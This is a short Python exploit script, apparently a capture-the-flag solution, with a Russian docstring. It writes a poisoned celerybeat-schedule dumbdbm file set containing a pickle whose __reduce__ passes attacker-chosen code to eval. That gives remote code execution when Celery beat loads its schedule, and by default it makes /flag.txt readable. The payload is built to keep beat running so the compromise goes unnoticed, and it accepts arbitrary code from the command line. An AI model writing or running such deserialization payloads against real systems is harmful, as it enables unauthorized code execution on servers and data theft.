"""Крафт dumbdbm-трио celerybeat-schedule.{dir,dat,bak} с pickle-payload.

shelve/beat: PersistentScheduler._create_schedule обращается к
self._store['entries'] -> pickle.loads(наше значение) -> RCE.
Payload через eval, чтобы значение оставалось валидным объектом ({}),
и beat не падал после выполнения.
"""
import pickle
import sys

CODE = sys.argv[1] if len(sys.argv) > 1 else "__import__('os').chmod('/flag.txt', 0o644) or {}"
PREFIX = sys.argv[2] if len(sys.argv) > 2 else "/tmp/uroki_test/data/celerybeat-schedule"


class Payload:
    def __reduce__(self):
        return (eval, (CODE,))


data = pickle.dumps(Payload(), protocol=2)

index = "'entries', (0, %d)\n" % len(data)

with open(PREFIX + ".dat", "wb") as f:
    f.write(data)
with open(PREFIX + ".bak", "wb") as f:
    f.write(data)
with open(PREFIX + ".dir", "w") as f:
    f.write(index)

print("payload code:", CODE)
print("pickle bytes:", len(data))
print("written:", PREFIX + ".dir/.dat/.bak")
